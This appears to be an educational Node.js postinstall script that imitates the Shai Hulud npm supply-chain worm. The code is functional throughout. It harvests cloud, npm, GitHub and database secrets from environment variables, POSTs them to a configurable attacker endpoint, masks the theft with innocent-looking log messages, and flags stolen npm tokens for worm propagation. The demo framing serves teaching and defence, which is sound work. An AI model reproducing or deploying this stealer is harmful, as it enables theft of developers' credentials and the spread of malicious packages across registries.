#!/usr/bin/env node
//
// SIMULATED malicious postinstall script (educational demo only).
// This mirrors what the real Shai Hulud payload did:
//   1. Scan environment for secrets (AWS keys, tokens, DB URLs)
//   2. Exfiltrate them to an attacker-controlled endpoint
//   3. If an NPM token is found, flag it for worm propagation
//

const http = require("http");
const os = require("os");

const ATTACKER_URL = process.env.ATTACKER_URL || "http://localhost:4444";

// --- Step 1: Harvest secrets from environment variables ---
const SECRET_PATTERNS = [
  /^AWS_/,
  /^NPM_/,
  /^GITHUB_/,
  /TOKEN/i,
  /SECRET/i,
  /PASSWORD/i,
  /^DATABASE_URL$/,
  /^STRIPE_/,
  /^DOCKER_/,
];

function harvestSecrets() {
  const found = {};
  for (const [key, value] of Object.entries(process.env)) {
    if (SECRET_PATTERNS.some((p) => p.test(key))) {
      found[key] = value;
    }
  }
  return found;
}

// --- Step 2: Exfiltrate to attacker C2 ---
function exfiltrate(secrets) {
  const payload = JSON.stringify({
    hostname: os.hostname(),
    secrets,
    npmToken: secrets.NPM_TOKEN || null,
    githubToken: secrets.GITHUB_TOKEN || null,
  });

  const url = new URL(ATTACKER_URL + "/exfil");
  const req = http.request(
    {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: "POST",
      headers: { "Content-Type": "application/json" },
    },
    (res) => {
      let body = "";
      res.on("data", (d) => (body += d));
      res.on("end", () => {
        console.log("[postinstall] dependencies configured successfully"); // innocent-looking log
      });
    }
  );
  req.on("error", () => {
    // Silently fail — real malware would retry or use DNS exfil
  });
  req.write(payload);
  req.end();
}

// --- Step 3: Simulate worm propagation check ---
function checkPropagation(secrets) {
  if (secrets.NPM_TOKEN) {
    // In the real attack, this would:
    //   npm whoami --registry ...
    //   npm publish malicious versions of all accessible packages
    console.log("[postinstall] asset optimization complete"); // disguised log
  }
}

// --- Execute ---
const secrets = harvestSecrets();
if (Object.keys(secrets).length > 0) {
  exfiltrate(secrets);
  checkPropagation(secrets);
}
